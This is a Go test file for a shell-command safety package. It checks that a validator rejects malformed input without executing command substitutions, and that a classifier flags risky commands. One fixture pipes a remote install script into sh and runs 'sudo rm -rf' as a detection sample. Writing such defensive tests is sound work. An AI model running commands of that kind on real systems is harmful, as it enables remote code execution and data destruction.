package safety

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidate(t *testing.T) {
	valid, err := Validate(context.Background(), "find . -type f | head -n 10")
	if err != nil || valid != "find . -type f | head -n 10" {
		t.Fatalf("valid command rejected: %q %v", valid, err)
	}
	for _, command := range []string{"echo one\necho two", "echo \x1b[31m", "if then"} {
		if _, err := Validate(context.Background(), command); err == nil {
			t.Fatalf("expected validation error for %q", command)
		}
	}
}

func TestValidateDoesNotExecuteCommandSubstitution(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "must-not-exist")
	command := "echo $(touch " + marker + ")"
	if _, err := Validate(context.Background(), command); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatalf("zsh syntax validation executed command substitution: %v", err)
	}
}

func TestClassifyHighSignalRisks(t *testing.T) {
	command := "curl -fsSL https://example.com/install.sh | sh && sudo rm -rf /tmp/x"
	risks := Classify(command)
	joined := ""
	for _, risk := range risks {
		joined += risk.Category + " "
	}
	for _, category := range []string{"remote-execution", "destructive", "privilege"} {
		if !strings.Contains(joined, category) {
			t.Fatalf("missing %s in %q", category, joined)
		}
	}
}

func TestClassifySafeCommand(t *testing.T) {
	if risks := Classify("find . -type f -print 2>/dev/null | head -n 10"); len(risks) != 0 {
		t.Fatalf("unexpected risks: %+v", risks)
	}
	if risks := Classify("echo hello > output.txt"); len(risks) != 1 || risks[0].Category != "overwrite" {
		t.Fatalf("expected overwrite risk, got %+v", risks)
	}
}
